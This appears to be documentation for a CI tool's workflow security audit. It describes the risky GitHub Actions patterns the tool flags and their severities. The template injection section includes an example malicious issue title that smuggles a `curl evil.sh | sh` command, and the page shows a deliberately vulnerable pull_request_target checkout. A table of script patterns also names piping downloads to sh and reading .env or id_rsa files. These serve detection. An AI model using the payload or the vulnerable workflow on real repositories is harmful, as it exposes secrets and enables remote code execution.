# Security audit

```bash
aeroci security                          # every workflow in the project
aeroci security .github/workflows/ci.yml # one file
aeroci security --json                   # machine-readable
aeroci security --report                 # write security-report.md
aeroci check --security                  # as part of the pre-flight check
```

It reads the YAML and reports what it finds. Nothing is executed and no
network call is made.

---

## Severity

| Level | Meaning |
|-------|---------|
| **critical** | Exploitable as written. Fix before merging. |
| **high** | A real risk that depends on context. Understand it before deciding. |
| **medium** | A bad habit with a plausible incident. |
| **low** | Worth knowing, rarely urgent. |
| **info** | Context. |

`--json` gives the same findings with a stable shape, so you can gate on a
level in CI. A workflow with no critical findings is not a workflow with no
findings.

---

## What it looks for

### Template injection into a shell — critical

A `run:` block that interpolates an expression a user controls. The
expression is substituted into the script text *before* the shell sees it, so
the value becomes shell syntax, not a string:

```yaml
# ❌ the issue title is executed as shell
- run: echo "Title: ${{ github.event.issue.title }}"

# ✅ the value reaches the step as data
- run: echo "Title: $TITLE"
  env:
    TITLE: ${{ github.event.issue.title }}
```

An attacker who opens an issue titled `"; curl evil.sh | sh; #` gets that
command run with the workflow's token.

The untrusted inputs it watches: issue and PR titles and bodies, comment
bodies, `head_commit.message`, `github.actor`, `github.head_ref`, and the
review and page fields.

The same check covers expressions reaching an `if:` condition, where the
substitution changes which branch runs.

### `pull_request_target` with a checkout of the PR head — critical

```yaml
on: pull_request_target       # runs with the base repo's token and secrets
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # …the fork's code
```

`pull_request_target` runs in the context of the base repository, with write
access and every secret. Checking out the PR head then executes the fork's
code with all of it. Anyone who can open a PR can use it.

### A hardcoded credential in the file — critical

Patterns for AWS keys (`AKIA…`, `ASIA…`), GitHub tokens (`ghp_`, `gho_`,
`ghs_`, `ghu_`, `ghs_`, fine-grained `github_pat_`), Slack, Google, GitLab and
npm tokens, private key blocks, JWTs and OpenAI-style keys.

Each finding says what to rotate, because a key that reached git is
compromised whether or not the workflow ever ran:

```
✖ a GitHub token is written in .github/workflows/ci.yml
  ↳ revoke it at github.com/settings/tokens
```

### Action pinning — high

```yaml
- uses: third-party/action@v1        # high: a tag can be repointed
- uses: third-party/action@main       # high: a branch moves continuously
- uses: third-party/action@v1.2.3     # still high
- uses: third-party/action@a1b2c3d4…   # ok: immutable
```

Only a full 40-character SHA is immutable. A short SHA is not: a prefix is
not a unique identifier, so two commits can share it.

Actions under `actions/*` at a version tag are reported at a lower severity,
since the blast radius of a compromised official action is smaller.

An action with **no version at all** (`uses: owner/repo`) is also high — it
tracks whatever the default branch has today.

### Token permissions — high

```yaml
permissions: write-all     # high
```

and, at medium, `write` on a scope the job does not need. The default
`GITHUB_TOKEN` is over-broad for most workflows, and
`permissions: { contents: read }` costs nothing to add.

### Exfiltration paths — high

A secret that flows somewhere a step outside the job can see it: into a
`run:` script, into an `if:` condition, or into a job that a
`workflow_run` / `issue_comment` trigger then re-runs with more access.

### `id-token: write` — high

OIDC is how a workflow gets cloud credentials, so an unnecessary one is worth
removing. Reported at the workflow level when no job needs it, and at the job
level so you can see which one asked.

### Untrusted input in a trigger context — critical / high

`issue_comment`, `workflow_run` and `pull_request_target` can be triggered by
anyone who can comment or open a PR. An action in that context, or a checkout
of untrusted code, is the combination above in a different trigger.

### Patterns in scripts — medium and low

| Pattern | Level | Why |
|---------|-------|-----|
| `curl … \| sh` | high | The script is executed without being read. |
| `eval "…"` | medium | Executes whatever the string contains. |
| `npm install --force` / `--unsafe-perm` | medium | Lifecycle scripts run with the permissions they ask for. |
| `git push --force` (without `--force-with-lease`) | medium | A concurrent push is silently discarded. |
| `chmod 777` | medium | World-writable. |
| `set -x` | low | Traces commands, so a secret in one is echoed. |
| `cat .env`, `cat …id_rsa` | low | The value reaches the log unless it is masked. |

---

## On self-hosted runners and dependency confusion

Older versions of this page advertised a "self-hosted runner risk scorer" and
a "dependency confusion guard". Neither exists, and neither should be faked.

The self-hosted case is a real risk, but deciding it needs knowledge the audit
does not have: whether your runner is single-tenant, whether it is ephemeral,
and what else lands on it. A rule that fired on every `runs-on: self-hosted`
would be noise you learn to ignore.

Dependency confusion is a property of your registry configuration, not of a
workflow file. What a workflow can show is a scoped install without a lockfile
— worth reading, not worth a severity.

If either becomes a real check, it goes in with a real rule behind it.

---

## Reports

`--report` writes a markdown file with every finding, grouped by severity and
annotated with its location:

```bash
aeroci security --report                 # security-report.md
aeroci security --report audit.md        # somewhere else
aeroci security --json > findings.json   # for a CI gate
```

Findings are de-duplicated across jobs: a missing `timeout-minutes` in four
jobs is one finding that says four, not four findings to scroll past.
